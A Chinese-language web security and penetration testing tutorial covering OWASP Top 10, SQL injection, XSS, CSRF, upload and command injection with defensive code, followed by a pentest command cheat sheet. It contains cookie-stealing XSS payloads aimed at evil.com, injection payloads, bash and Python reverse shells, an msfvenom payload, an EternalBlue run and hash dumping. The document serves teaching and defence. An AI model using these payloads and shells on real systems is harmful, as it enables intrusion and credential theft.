---
order: 20
title: Web 安全与渗透测试
module: 'cybersecurity'
category: 云与基础设施
difficulty: intermediate
description: OWASP Top 10漏洞、SQL注入、XSS、CSRF、文件上传与命令执行漏洞、渗透测试流程、Nmap扫描、Burp Suite漏洞扫描。
author: fanquanpp
updated: '2026-09-08'
related:
  - 'cybersecurity/001-SecurityBasicsDefense'
  - 'cybersecurity/003-BinarySecurityAndIncidentResponse'
  - 'cybersecurity/004-SecurityToolsPractice'
prerequisites: []
---

## 1. OWASP Top 10

### 1.1 2021 版 OWASP Top 10

| 排名 | 风险                   | 说明                             |
| :--- | :--------------------- | :------------------------------- |
| A01  | 权限控制失效           | 越权访问、IDOR、CORS 配置错误    |
| A02  | 加密机制失效           | 弱密码、明文存储、不安全协议     |
| A03  | 注入                   | SQL/NoSQL/OS/LDAP 注入           |
| A04  | 不安全设计             | 缺乏安全架构、威胁建模不足       |
| A05  | 安全配置错误           | 默认配置、目录遍历、错误信息泄露 |
| A06  | 易受攻击和过时的组件   | 使用已知漏洞的第三方库           |
| A07  | 身份识别和认证失败     | 弱密码策略、会话管理缺陷         |
| A08  | 软件和数据完整性失败   | 不安全的 CI/CD、反序列化漏洞     |
| A09  | 安全日志和监控失效     | 日志不足、告警缺失               |
| A10  | 服务器端请求伪造(SSRF) | 内网探测、云元数据泄露           |

## 2. SQL 注入

### 2.1 注入类型

| 类型     | 特点                     | 检测难度 |
| :------- | :----------------------- | :------- |
| 联合查询 | UNION SELECT 拼接        | 低       |
| 报错注入 | 利用数据库报错信息回显   | 低       |
| 布尔盲注 | 通过真/假响应判断        | 中       |
| 时间盲注 | 通过响应延迟判断         | 高       |
| 堆叠查询 | 多语句执行（;分隔）      | 低       |
| 二次注入 | 数据存储后再次使用时触发 | 高       |

### 2.2 注入示例与防御

```sql
-- 联合查询注入
-- 原始查询: SELECT * FROM users WHERE id = '$id'
-- 注入 payload: ' UNION SELECT 1,username,password FROM users --
SELECT * FROM users WHERE id = '' UNION SELECT 1,username,password FROM users --'

-- 布尔盲注
-- payload: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
-- 逐字符爆破密码

-- 时间盲注
-- payload: ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0) --
```

**防御措施**：

```python
#  不安全：字符串拼接
query = f"SELECT * FROM users WHERE id = '{user_id}'"

#  安全：参数化查询
import sqlite3
conn = sqlite3.connect('app.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

#  安全：ORM 框架
# SQLAlchemy
user = session.query(User).filter(User.id == user_id).first()

#  安全：输入验证
import re
if not re.match(r'^\d+$', user_id):
    raise ValueError("Invalid user ID")
```

## 3. XSS 跨站脚本

### 3.1 XSS 类型

| 类型       | 注入位置       | 持久性 | 危害 |
| :--------- | :------------- | :----- | :--- |
| 反射型 XSS | URL 参数       | 否     | 中   |
| 存储型 XSS | 服务器存储     | 是     | 高   |
| DOM 型 XSS | 客户端 JS 渲染 | 否     | 中   |

### 3.2 XSS 攻击示例

```html
<!-- 反射型 XSS -->
<!-- URL: https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script> -->

<!-- 存储型 XSS -->
<!-- 留言板提交: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)"> -->

<!-- DOM 型 XSS -->
<!-- 页面 JS: document.getElementById('output').innerHTML = location.hash.slice(1) -->
<!-- URL: https://example.com/page#<img src=x onerror=alert(1)> -->
```

### 3.3 XSS 防御

```python
# 后端输出编码
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    safe_query = escape(query)  # HTML 实体编码
    return f'<p>搜索结果: {safe_query}</p>'
```

```javascript
// 前端防御
// 1. 使用 textContent 代替 innerHTML
element.textContent = userInput;

// 2. DOMPurify 清洗 HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 3. Content Security Policy
// HTTP 响应头
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

```python
# Flask CSP 配置
from flask_talisman import Talisman
app = Flask(__name__)
Talisman(app, content_security_policy={
    'default-src': "'self'",
    'script-src': "'self'",
    'style-src': "'self' 'unsafe-inline'"
})
```

## 4. CSRF 跨站请求伪造

### 4.1 攻击原理

```
1. 用户登录 bank.com，获取会话 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 页面包含:
   <img src="https://bank.com/transfer?to=hacker&amount=10000">
4. 浏览器自动携带 bank.com 的 Cookie 发送请求
5. bank.com 服务器认为是合法操作
```

### 4.2 CSRF 防御

```python
# Flask-WTF CSRF Token
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

# 模板中
# <form method="POST">
#   <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
#   ...
# </form>
```

```python
# SameSite Cookie 属性
app.config.update(
    SESSION_COOKIE_SECURE=True,     # 仅 HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # JS 不可读
    SESSION_COOKIE_SAMESITE='Lax'   # 限制跨站发送
)
```

```python
# 验证 Origin/Referer 头
from flask import request, abort

@app.before_request
def check_origin():
    if request.method in ('POST', 'PUT', 'DELETE'):
        origin = request.headers.get('Origin', '')
        allowed = ['https://www.fandex.local', 'https://fandex.local']
        if origin not in allowed:
            abort(403)
```

## 5. 文件上传漏洞

### 5.1 常见绕过方式

| 绕过方式       | 方法                           |
| :------------- | :----------------------------- |
| 后缀名绕过     | .php5、.phtml、.php.jpg        |
| MIME 类型绕过  | 修改 Content-Type: image/jpeg  |
| 大小写绕过     | .PhP、.pHp                     |
| 双写绕过       | .pphphp（过滤 php 后剩余 php） |
| %00 截断       | shell.php%00.jpg               |
| .htaccess 上传 | 自定义解析规则                 |

### 5.2 安全上传实现

```python
import os
import uuid
from pathlib import Path
from flask import request, jsonify

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    ext = filename.rsplit('.', 1)[-1].lower()
    return ext in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400

    file = request.files['file']

    # 1. 检查文件扩展名
    if not allowed_file(file.filename):
        return jsonify({'error': 'File type not allowed'}), 400

    # 2. 检查文件大小
    file.seek(0, os.SEEK_END)
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        return jsonify({'error': 'File too large'}), 400

    # 3. 重命名文件（防止路径穿越）
    ext = file.filename.rsplit('.', 1)[-1].lower()
    safe_name = f"{uuid.uuid4().hex}.{ext}"

    # 4. 保存到 Web 根目录外
    upload_dir = '/data/uploads'
    file.save(os.path.join(upload_dir, safe_name))

    return jsonify({'filename': safe_name}), 200
```

## 6. 命令执行漏洞

### 6.1 命令注入

```python
#  不安全：直接拼接用户输入
import os
def ping_host(host):
    os.system(f"ping -c 3 {host}")  # 危险！
    # 攻击: host = "127.0.0.1; cat /etc/passwd"

#  安全：使用 subprocess + 参数列表
import subprocess
def ping_host_safe(host):
    # 输入验证
    if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host):
        raise ValueError("Invalid IP address")
    result = subprocess.run(
        ['ping', '-c', '3', host],
        capture_output=True, text=True, timeout=10
    )
    return result.stdout
```

## 7. 渗透测试流程

### 7.1 标准流程

```
1. 前期交互 → 确定范围、规则、目标
2. 信息收集 → 被动/主动侦察
3. 威胁建模 → 识别攻击面和攻击路径
4. 漏洞分析 → 扫描、验证、分类
5. 渗透攻击 → 利用漏洞获取访问权限
6. 后渗透   → 权限提升、横向移动、数据获取
7. 报告撰写 → 发现、风险评级、修复建议
```

### 7.2 信息收集

```bash
# 被动信息收集
whois example.com                     # 域名注册信息
dig example.com ANY                   # DNS 记录
theHarvester -d example.com -b all    # 邮箱/子域名收集

# 主动信息收集
nmap -sn 192.168.1.0/24              # 主机发现
nmap -sV -sC -p- 192.168.1.1        # 全端口服务识别
nmap -O 192.168.1.1                  # 操作系统识别
nmap --script vuln 192.168.1.1       # 漏洞扫描脚本
```

## 8. Nmap 端口扫描

### 8.1 扫描类型

| 参数 | 扫描类型       | 特点                   | 隐蔽性 |
| :--- | :------------- | :--------------------- | :----- |
| -sS  | SYN 半开扫描   | 不完成三次握手，速度快 | 高     |
| -sT  | TCP 全连接扫描 | 完成三次握手           | 低     |
| -sU  | UDP 扫描       | 扫描 UDP 端口          | 中     |
| -sA  | ACK 扫描       | 检测防火墙规则         | 高     |
| -sF  | FIN 扫描       | FIN 包探测             | 高     |

### 8.2 常用命令

```bash
# 快速扫描常用端口
nmap -F 192.168.1.0/24

# 全端口扫描 + 服务版本 + 默认脚本
nmap -sV -sC -p- -T4 192.168.1.1

# 指定端口扫描
nmap -p 22,80,443,3306,8080 192.168.1.1

# 操作系统检测
nmap -O --osscan-guess 192.168.1.1

# 漏洞扫描
nmap --script=vulscan/vulscan.nse 192.168.1.1

# 绕过防火墙
nmap -f -D RND:10 --data-length 32 192.168.1.1

# 输出结果
nmap -sV -oX scan_results.xml 192.168.1.0/24
```

## 9. Burp Suite 漏洞扫描

### 9.1 核心模块

| 模块     | 功能                      |
| :------- | :------------------------ |
| Proxy    | 拦截和修改 HTTP 请求/响应 |
| Scanner  | 自动化漏洞扫描            |
| Intruder | 自定义攻击载荷暴力破解    |
| Repeater | 手动重放和修改请求        |
| Decoder  | 编码/解码工具             |
| Comparer | 请求/响应对比             |

### 9.2 常用工作流

```
1. 配置浏览器代理 → 127.0.0.1:8080
2. 开启 Intercept → 捕获请求
3. 发送到 Repeater → 手动测试参数
4. 发送到 Intruder → 标记攻击点，设置 Payload
5. 运行 Scanner → 自动扫描漏洞
6. 分析结果 → 验证漏洞、编写报告
```

### 9.3 Intruder 暴力破解示例

```
攻击类型: Sniper（单参数）/ Pitchfork（多参数并行）/ Cluster Bomb（多参数组合）

目标请求:
POST /login HTTP/1.1
username=§admin§&password=§password§

Payload 设置:
- username: 常用用户名字典
- password: 常用密码字典

Grep-Match:
- 匹配 "Login successful" → 成功
- 匹配 "Invalid credentials" → 失败
```
## 信息收集

**基本写法:DNS 枚举**
`dig any <域名>`
```bash
# 查询域名所有 DNS 记录
dig any example.com
```

**基本写法:子域名枚举**
`subfinder -d <域名>`
```bash
# 使用 subfinder 枚举子域名
subfinder -d example.com -o subdomains.txt
```

**基本写法:DNS 区域传送测试**
`dig axfr @<DNS服务器> <域名>`
```bash
# 测试 DNS 区域传送是否允许
dig axfr @ns1.example.com example.com
```

**基本写法:Whois 查询**
`whois <域名>`
```bash
# 查询域名注册信息
whois example.com
```

**基本写法:搜索引擎语法**
`site:<域名> intitle:"index of"`
```bash
# 使用 Google Hacking 查找敏感信息
site:example.com intitle:"index of" -inurl:(html|php)
```

---

## 端口扫描

**基本写法:nmap 基础扫描**
`nmap -sV <目标>`
```bash
# 扫描目标开放端口与服务版本
nmap -sV 192.168.1.10
```

**基本写法:快速端口扫描**
`nmap -T4 -F <目标>`
```bash
# 快速扫描常用端口
nmap -T4 -F 192.168.1.10
```

**基本写法:全端口扫描**
`nmap -p- -T4 <目标>`
```bash
# 扫描所有 65535 个端口
nmap -p- -T4 192.168.1.10
```

**基本写法:UDP 端口扫描**
`nmap -sU --top-ports <数量> <目标>`
```bash
# 扫描常用 UDP 端口
sudo nmap -sU --top-ports 100 192.168.1.10
```

**基本写法:操作系统识别**
`nmap -O <目标>`
```bash
# 识别目标操作系统
sudo nmap -O 192.168.1.10
```

**基本写法:漏洞脚本扫描**
`nmap --script vuln <目标>`
```bash
# 使用 nmap 漏洞脚本扫描
nmap --script vuln 192.168.1.10
```

---

## 服务枚举

**基本写法:SMB 枚举**
`enum4linux <目标>`
```bash
# 枚举 SMB 共享与用户信息
enum4linux -a 192.168.1.10
```

**基本写法:NFS 枚举**
`showmount -e <目标>`
```bash
# 查看 NFS 导出的目录
showmount -e 192.168.1.10
```

**基本写法:SSH 枚举**
`nmap --script ssh-* -p 22 <目标>`
```bash
# 使用 nmap SSH 脚本枚举
nmap --script ssh-* -p 22 192.168.1.10
```

**基本写法:SNMP 枚举**
`snmpwalk -c public -v1 <目标>`
```bash
# 枚举 SNMP 信息
snmpwalk -c public -v1 192.168.1.10
```

**基本写法:LDAP 枚举**
`ldapsearch -x -H ldap://<目标> -b <基准DN>`
```bash
# 枚举 LDAP 目录信息
ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com"
```

---

## Web 应用测试

**基本写法:目录爆破**
`gobuster dir -u <URL> -w <字典>`
```bash
# 使用 gobuster 爆破 Web 目录
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
```

**基本写法:子域名爆破**
`gobuster dns -d <域名> -w <字典>`
```bash
# 爆破子域名
gobuster dns -d example.com -w subdomains.txt
```

**基本写法:Nikto 漏洞扫描**
`nikto -h <URL>`
```bash
# 使用 Nikto 扫描 Web 漏洞
nikto -h https://example.com
```

**基本写法:SQL 注入测试**
`sqlmap -u <URL> --dbs`
```bash
# 使用 sqlmap 测试 SQL 注入
sqlmap -u "https://example.com/page?id=1" --dbs
```

**基本写法:XSS 检测**
`dalfox url <URL>`
```bash
# 使用 dalfox 检测 XSS 漏洞
dalfox url "https://example.com/search?q=test"
```

**基本写法:WordPress 扫描**
`wpscan --url <URL>`
```bash
# 扫描 WordPress 站点
wpscan --url https://example.com --enumerate u
```

---

## 漏洞利用

**基本写法:搜索漏洞**
`searchsploit <关键字>`
```bash
# 在 exploitdb 中搜索漏洞利用
searchsploit apache 2.4
```

**基本写法:查看漏洞详情**
`searchsploit -x <漏洞ID>`
```bash
# 查看漏洞利用代码详情
searchsploit -x 12345
```

**基本写法:复制漏洞利用代码**
`searchsploit -m <漏洞ID>`
```bash
# 复制漏洞利用代码到当前目录
searchsploit -m 12345
```

**基本写法:使用 Metasploit**
`msfconsole -q -x "use <模块>; set RHOSTS <目标>; run"`
```bash
# 使用 Metasploit 利用漏洞
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; run"
```

**基本写法:生成 Payload**
`msfvenom -p <payload> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 生成反向连接 Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

---

## 密码破解

**基本写法:使用 hashcat 破解**
`hashcat -m <类型> <哈希> <字典>`
```bash
# 使用 hashcat 破解 MD5 哈希(类型 0)
hashcat -m 0 hash.txt rockyou.txt
```

**基本写法:使用 john 破解**
`john --wordlist=<字典> <哈希文件>`
```bash
# 使用 John the Ripper 破解密码
john --wordlist=rockyou.txt hashes.txt
```

**基本写法:破解 zip 密码**
`john --wordlist=<字典> <zip2john输出>`
```bash
# 破解 ZIP 文件密码
zip2john protected.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

**基本写法:在线哈希查询**
`curl "https://hashtoolkit.com/reverse-hash?hash=<哈希>"`
```bash
# 在线查询哈希明文
curl "https://hashtoolkit.com/reverse-hash?hash=098f6bcd4621d373cade4e832627b4f6"
```

**基本写法:SSH 密码爆破**
`hydra -l <用户> -P <字典> ssh://<目标>`
```bash
# 使用 hydra 爆破 SSH
hydra -l root -P passwords.txt ssh://192.168.1.10
```

---

## 后渗透操作

**基本写法:建立反弹 shell**
`bash -i >& /dev/tcp/<攻击IP>/<端口> 0>&1`
```bash
# 通过 bash 反弹 shell 到攻击机
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```

**基本写法:Python 反弹 shell**
`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<端口>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'`
```bash
# Python 反弹 shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'
```

**基本写法:升级交互式 shell**
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
```bash
# 升级为交互式 shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**基本写法:端口转发**
`ssh -L <本地端口>:<目标>:<目标端口> <用户>@<跳板>`
```bash
# SSH 本地端口转发
ssh -L 8080:192.168.2.10:80 user@192.168.1.10
```

**基本写法:动态端口转发**
`ssh -D <本地端口> <用户>@<跳板>`
```bash
# SSH 动态端口转发建立 SOCKS 代理
ssh -D 1080 user@192.168.1.10
```

---

## 权限提升

**基本写法:查找 SUID 文件**
`find / -perm -4000 -type f 2>/dev/null`
```bash
# 查找 SUID 权限文件用于提权
find / -perm -4000 -type f 2>/dev/null
```

**基本写法:查看 sudo 权限**
`sudo -l`
```bash
# 查看当前用户 sudo 权限
sudo -l
```

**基本写法:使用 LinPEAS 枚举**
`./linpeas.sh`
```bash
# 运行 LinPEAS 自动枚举提权路径
./linpeas.sh | grep -i "suid\|sudo\|writable"
```

**基本写法:查看内核版本**
`uname -r`
```bash
# 查看内核版本查找内核漏洞
uname -r
```

**基本写法:查看计划任务**
`cat /etc/crontab`
```bash
# 查看系统计划任务寻找提权点
cat /etc/crontab
```

---

## 内网渗透

**基本写法:内网存活主机探测**
`nmap -sn <网段>`
```bash
# Ping 扫描探测存活主机
nmap -sn 192.168.1.0/24
```

**基本写法:使用 Proxychains**
`proxychains <命令>`
```bash
# 通过 SOCKS 代理执行命令
proxychains nmap -sT -Pn 192.168.2.0/24
```

**基本写法:搭建 SOCKS 代理**
`ssh -D <端口> <用户>@<跳板> -fN`
```bash
# 使用 SSH 建立后台 SOCKS 代理
ssh -D 1080 user@192.168.1.10 -fN
```

**基本写法:内网端口扫描**
`nmap -sT -Pn -n --top-ports 100 <网段>`
```bash
# 通过代理扫描内网常用端口
proxychains nmap -sT -Pn -n --top-ports 100 192.168.2.0/24
```

**基本写法:Windows 凭据收集**
`secretsdump.py -local <文件>`
```bash
# 使用 impacket 导出 SAM 哈希
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## 报告生成

**基本写法:生成扫描报告**
`nmap -sV <目标> -oX <输出文件>`
```bash
# 输出 XML 格式扫描报告
nmap -sV 192.168.1.10 -oX scan_report.xml
```

**基本写法:转换为 HTML 报告**
`xsltproc <XML文件> -o <HTML文件>`
```bash
# 将 nmap XML 报告转为 HTML
xsltproc scan_report.xml -o report.html
```

**基本写法:整合多种扫描结果**
`python3 -c "import xml.etree.ElementTree as ET; ..."`
```bash
# 解析多个工具的扫描结果整合报告
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scan_report.xml')
for host in tree.findall('host'):
    print(host.find('address').get('addr'))
"
```

**基本写法:生成渗透测试报告**
`pandoc <输入> -o <输出>`
```bash
# 使用 pandoc 生成 PDF 报告
pandoc report.md -o pentest_report.pdf --pdf-engine=xelatex
```

**基本写法:导出漏洞清单**
`grep -E "CVE|OSVDB" <报告> > <漏洞清单>`
```bash
# 提取所有漏洞编号
grep -E "CVE-[0-9]+-[0-9]+|OSVDB" scan_report.txt > vulnerabilities.txt
```
